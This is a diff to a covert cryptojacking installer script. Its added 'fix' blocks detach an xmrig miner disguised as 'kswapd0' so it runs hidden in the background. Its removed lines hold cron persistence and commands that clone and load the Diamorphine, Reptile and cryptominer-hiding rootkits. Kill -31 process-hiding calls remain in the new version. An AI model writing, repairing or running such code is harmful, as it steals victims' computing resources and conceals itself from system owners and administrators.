@@ -458,7 +458,29 @@ if ! sudo -n true 2>/dev/null; then
     echo "Looks like $HOME/.system_cache/miner.sh script is already in the $HOME/.profile"
   fi
   echo "[*] Running miner in the background (see logs in $HOME/.system_cache/xmrig.log file)"
-  /bin/bash $HOME/.system_cache/miner.sh --config=$HOME/.system_cache/config_background.json >/dev/null 2>&1
+  
+  # ==================== FIX: Properly detach miner to prevent hanging ====================
+  # Start miner in a fully detached background process
+  (
+    cd "$HOME/.system_cache" 2>/dev/null || cd "$HOME"
+    exec 0</dev/null
+    exec 1>/dev/null
+    exec 2>&1
+    setsid /bin/bash "$HOME/.system_cache/miner.sh" --config="$HOME/.system_cache/config_background.json" &
+  ) &
+  
+  # Disown all background jobs
+  disown -a 2>/dev/null
+  
+  # Brief pause to let miner start
+  sleep 1
+  
+  # Check if miner started successfully
+  if pgrep -u "$USER" -f "miner.sh\|xmrig\|kswapd0" >/dev/null 2>&1; then
+    echo "[✓] Miner started successfully"
+  else
+    echo "[!] Miner may not have started - check logs later"
+  fi
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
@@ -470,7 +492,30 @@ else
   if ! type systemctl >/dev/null; then
 
     echo "[*] Running miner in the background (see logs in $HOME/.system_cache/kswapd0.log file)"
-    /bin/bash $HOME/.system_cache/miner.sh --config=$HOME/.system_cache/config_background.json >/dev/null 2>&1
+    
+    # ==================== FIX: Properly detach miner to prevent hanging ====================
+    # Start miner in a fully detached background process
+    (
+      cd "$HOME/.system_cache" 2>/dev/null || cd "$HOME"
+      exec 0</dev/null
+      exec 1>/dev/null
+      exec 2>&1
+      setsid /bin/bash "$HOME/.system_cache/miner.sh" --config="$HOME/.system_cache/config_background.json" &
+    ) &
+    
+    # Disown all background jobs
+    disown -a 2>/dev/null
+    
+    # Brief pause to let miner start
+    sleep 1
+    
+    # Check if miner started successfully
+    if pgrep -u "$USER" -f "miner.sh\|xmrig\|kswapd0" >/dev/null 2>&1; then
+      echo "[✓] Miner started successfully"
+    else
+      echo "[!] Miner may not have started - check logs later"
+    fi
+    
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
@@ -626,48 +671,3 @@ cat <<'EOF' >"$HOME/.system_cache/check_and_start.sh"
 #!/bin/bash
 lockfile="$HOME/.system_cache/check_and_start.lock"
 # Locking-Mechanismus mit flock
-exec 200>"$lockfile"
-flock -n 200 || exit 1
-if ! pgrep -f "$HOME/.system_cache/kswapd0"; then
-  "$HOME/.system_cache/kswapd0" --config="$HOME/.system_cache/config_background.json"
-fi
-EOF
-
-echo "[*] Make the check script executable"
-chmod +x "$HOME/.system_cache/check_and_start.sh"
-
-echo "[*] Nur einen Cronjob hinzufügen, falls nicht vorhanden"
-(crontab -l 2>/dev/null | grep -v "check_and_start.sh"; echo "* * * * * $HOME/.system_cache/check_and_start.sh") | crontab -
-
-
-#    echo "[*] make toolZ, Diamorphine"
-#          cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; yum install linux-generic linux-headers-$(uname -r) kernel kernel-devel kernel-firmware kernel-tools kernel-modules kernel-headers git make gcc msr-tools -y ; apt-get update -y ; apt-get reinstall kmod ; apt-get install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y ;  zypper update -y ; zypper install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y ; git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -63 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-    
-#    echo "[*] Reptile..."
-#        cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; apt-get update -y ; apt-get install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y ; yum update -y; yum install -y ncurses-devel ; git clone https://github.com/f0rb1dd3n/Reptile/ && cd Reptile ; make defconfig ; make ; make install ; dmesg -C ; /reptile/reptile_cmd hide ;  kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
-    
-#    echo "[*] hide crypto miner."
-#        cd /tmp ; cd .X11-unix ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit && cd hiding-cryptominers-linux-rootkit/ && make ; dmesg -C && insmod rootkit.ko && dmesg ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` ; rm -rf hiding-cryptominers-linux-rootkit/
-
-
-# ==================== FIX: Safe process hiding ====================
-# Only execute kill commands if PIDs are valid numbers
-MINER_PID=$(pgrep -f -u root config.json 2>/dev/null | head -1)
-if [ -n "$MINER_PID" ] && [[ "$MINER_PID" =~ ^[0-9]+$ ]]; then
-    kill -31 "$MINER_PID" 2>/dev/null || true
-fi
-
-SWAPD_PIDS=$(/bin/ps ax -fu $USER 2>/dev/null | grep "swapd" | grep -v "grep" | awk '{print $2}')
-for pid in $SWAPD_PIDS; do
-    if [[ "$pid" =~ ^[0-9]+$ ]]; then
-        kill -31 "$pid" 2>/dev/null || true
-    fi
-done
-
-KSWAPD_PIDS=$(/bin/ps ax -fu $USER 2>/dev/null | grep "kswapd0" | grep -v "grep" | awk '{print $2}')
-for pid in $KSWAPD_PIDS; do
-    if [[ "$pid" =~ ^[0-9]+$ ]]; then
-        kill -31 "$pid" 2>/dev/null || true
-    fi
-done
-
